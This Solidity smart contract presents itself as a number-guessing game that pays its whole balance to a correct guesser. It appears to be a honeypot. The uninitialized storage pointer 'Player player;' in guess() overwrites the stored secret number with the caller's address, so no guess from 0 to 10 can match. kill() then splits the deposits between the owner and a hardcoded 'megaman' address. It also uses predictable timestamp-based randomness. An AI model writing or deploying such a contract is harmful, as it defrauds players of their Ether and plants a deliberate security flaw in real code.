

pragma solidity ^0.4.23;

contract NumberBetweenZeroAndTen {


    uint256 private secretNumber;
    uint256 public lastPlayed;
    address public owner;
    address constant megaman = 0xc316F2bbcCeE013472d2f709414602cF7Fea6007;
    
    struct Player {
        address addr;
        uint256 ethr;
    }
    
    Player[] players;
    
    constructor() public {
        owner = msg.sender;
        shuffle();
    }
    
    function guess(uint256 number) public payable {

        require(number >= 0 && number <= 10);
        
        lastPlayed = now;
        
        Player player;
        player.addr = msg.sender;
        player.ethr = msg.value;
        players.push(player);
        
        if (number == secretNumber) {
            msg.sender.transfer(address(this).balance);
        }
        
        shuffle();
    }
    
    function shuffle() internal {

        secretNumber = uint8(keccak256(abi.encodePacked(block.timestamp, msg.sender))) % 10 + 1;
    }

    function kill() public {

        require(msg.sender == owner, "You are not the owner of contract");
        uint256 balance = address(this).balance;
        megaman.transfer((balance*20)/100);
        owner.transfer((balance*80)/100);
    }
}